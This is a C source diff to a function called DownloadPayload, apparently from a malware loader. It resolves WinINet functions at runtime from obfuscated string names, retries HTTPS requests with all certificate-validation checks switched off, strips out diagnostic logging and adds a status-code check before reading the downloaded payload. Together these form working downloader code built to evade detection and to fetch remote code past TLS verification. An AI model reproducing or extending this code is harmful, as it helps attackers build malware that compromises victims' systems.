@@ -23,7 +23,6 @@
 #define SECURITY_FLAG_IGNORE_CERT_CN_INVALID    0x00001000
 #define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID  0x00002000
 #define SECURITY_FLAG_IGNORE_REVOCATION         0x00000080
-#define HTTP_QUERY_CONTENT_LENGTH       5
 #define HTTP_QUERY_STATUS_CODE          19
 #define HTTP_QUERY_FLAG_NUMBER          0x20000000
 #define INTERNET_SCHEME_HTTP            3
@@ -178,16 +177,11 @@ BOOL DownloadPayload(
     // MSDN pattern: the SSL context is created by the first attempt,
     // so security flags can only be modified after it fails
     if (!bSent && bHttps && pInetSetOpt) {
-        DWORD dwErr = GetLastError();
-        LOG_STATUS("[*] First send failed, error", (NTSTATUS)dwErr);
-
         // Query existing security flags on this handle (SSL context exists now)
         DWORD dwSecFlags = 0;
         DWORD dwBuffLen  = sizeof(dwSecFlags);
-        if (pInetQueryOpt) {
+        if (pInetQueryOpt)
             pInetQueryOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, &dwBuffLen);
-            LOG_STATUS("[*] Current sec flags", (NTSTATUS)dwSecFlags);
-        }
 
         // OR in all cert-ignore flags
         dwSecFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA
@@ -195,17 +189,10 @@ BOOL DownloadPayload(
                     |  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                     |  SECURITY_FLAG_IGNORE_REVOCATION;
 
-        BOOL bSetOk = pInetSetOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
-        LOG_STATUS("[*] SetOption result", (NTSTATUS)bSetOk);
+        pInetSetOpt(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
 
         // Retry on SAME handle - SSL context preserved
-        LOG("[*] Retrying with cert bypass...");
         bSent = pHttpSend(hRequest, NULL, 0, NULL, 0);
-
-        if (!bSent) {
-            dwErr = GetLastError();
-            LOG_STATUS("[!] Retry also failed, error", (NTSTATUS)dwErr);
-        }
     }
 
     if (!bSent) {
@@ -216,6 +203,26 @@ BOOL DownloadPayload(
         return FALSE;
     }
     LOG("[+] Request sent, reading response...");
+
+    // Verify HTTP 200 OK before reading body
+    BYTE xQueryInfo[] = XSTR_HTTP_QUERY_INFO_A;
+    DEOBF(xQueryInfo);
+    fnHttpQueryInfoA pHttpQuery = (fnHttpQueryInfoA)pApi->pGetProcAddress(hWinInet, (LPCSTR)xQueryInfo);
+    if (pHttpQuery) {
+        DWORD dwStatusCode = 0;
+        DWORD dwStatusLen  = sizeof(dwStatusCode);
+        DWORD dwIndex      = 0;
+        if (pHttpQuery(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
+                       &dwStatusCode, &dwStatusLen, &dwIndex)) {
+            if (dwStatusCode != 200) {
+                LOG("[!] Server returned non-200 status");
+                pInetClose(hRequest);
+                pInetClose(hConnect);
+                pInetClose(hInternet);
+                return FALSE;
+            }
+        }
+    }
 
     // Read response in chunks
     SIZE_T  sTotalSize = 0;
